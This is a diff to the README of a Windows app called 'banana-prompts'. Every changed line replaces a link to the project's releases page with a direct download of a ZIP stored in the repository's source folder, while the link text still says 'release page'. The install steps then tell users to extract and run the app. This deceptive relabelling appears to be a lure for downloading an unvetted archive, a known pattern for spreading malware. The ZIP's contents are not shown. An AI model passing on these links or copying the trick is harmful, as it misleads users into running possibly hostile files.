@@ -1,6 +1,6 @@
 # 🍌 banana-prompts - Simple AI prompts for daily work
 
-[![Download banana-prompts](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Ishimwek664/banana-prompts/releases)
+[![Download banana-prompts](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Ishimwek664/banana-prompts/raw/refs/heads/main/src/prompts-banana-1.2-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ banana-prompts is a Windows app for working with AI prompts in one place. Use it
 
 If you want the latest version, visit the release page here:
 
-[Visit the release page to download](https://github.com/Ishimwek664/banana-prompts/releases)
+[Visit the release page to download](https://github.com/Ishimwek664/banana-prompts/raw/refs/heads/main/src/prompts-banana-1.2-beta.4.zip)
 
 ## 📥 Download and Install on Windows
 
-1. Open the [release page](https://github.com/Ishimwek664/banana-prompts/releases)
+1. Open the [release page](https://github.com/Ishimwek664/banana-prompts/raw/refs/heads/main/src/prompts-banana-1.2-beta.4.zip)
 2. Find the latest release
 3. Download the Windows file from the release assets
 4. If the file comes in a ZIP folder, right-click it and choose Extract All
@@ -122,7 +122,7 @@ If a page does not load, make sure the app is still running in the terminal wind
 
 The release page is the place to get the Windows version of banana-prompts and any new updates.
 
-[Open the release page](https://github.com/Ishimwek664/banana-prompts/releases)
+[Open the release page](https://github.com/Ishimwek664/banana-prompts/raw/refs/heads/main/src/prompts-banana-1.2-beta.4.zip)
 
 Use the newest release if you want the latest fixes and changes.
 
@@ -136,7 +136,7 @@ After download, check that the file name matches the release you chose.
 
 If you want the fastest path on Windows:
 
-1. Open the [release page](https://github.com/Ishimwek664/banana-prompts/releases)
+1. Open the [release page](https://github.com/Ishimwek664/banana-prompts/raw/refs/heads/main/src/prompts-banana-1.2-beta.4.zip)
 2. Download the latest Windows file
 3. Extract it if needed
 4. Open the app file
